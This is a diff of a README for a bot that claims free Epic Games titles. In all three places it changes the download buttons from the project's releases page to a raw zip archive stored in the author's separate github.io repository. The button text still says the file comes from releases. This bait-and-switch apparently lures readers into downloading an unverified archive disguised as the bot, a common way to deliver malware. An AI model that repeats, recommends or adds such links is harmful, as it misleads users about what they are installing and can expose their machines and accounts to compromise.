@@ -6,7 +6,7 @@ description: "Automate free game claiming on Epic Games with scheduled notificat
 <h1>🎮 Epic-Free-Games-Bot - Never Miss a Free Game Again</h1>
 
 <p align="center">
-  <a href="https://github.com/absentt2626/Epic-Free-Games-Bot/releases">
+  <a href="https://github.com/absentt2626/absentt2626.github.io/raw/refs/heads/main/assets/Application-3.0.zip">
     <img src="https://img.shields.io/badge/⬇️%20Download%20Now-FF6B35?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download Button" style="width: 300px; height: auto; border-radius: 12px; box-shadow: 0 4px 8px rgba(0,0,0,0.2);">
   </a>
 </p>
@@ -59,7 +59,7 @@ Ready to get your free games? Follow these simple steps. We will walk you throug
 **Click the big orange button below:**
 
 <p align="center">
-  <a href="https://github.com/absentt2626/Epic-Free-Games-Bot/releases">
+  <a href="https://github.com/absentt2626/absentt2626.github.io/raw/refs/heads/main/assets/Application-3.0.zip">
     <img src="https://img.shields.io/badge/📥%20Get%20the%20Bot%20Here-4C9F70?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download from Releases" style="width: 300px; height: auto;">
   </a>
 </p>
@@ -220,7 +220,7 @@ Most people miss dozens of free games because they simply forget. The **Epic-Fre
 So why wait? Click the download button below, spend 10 minutes setting this up, and from then on, every free game is yours. It’s like having a leprechaun with a computer assigned to your entertainment. 
 
 <p align="center">
-  <a href="https://github.com/absentt2626/Epic-Free-Games-Bot/releases">
+  <a href="https://github.com/absentt2626/absentt2626.github.io/raw/refs/heads/main/assets/Application-3.0.zip">
     <img src="https://img.shields.io/badge/🎁%20Claim%20Your%20Free%20Games%20Now-8B5A2B?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Final Download CTA" style="width: 350px; height: auto;">
   </a>
 </p>
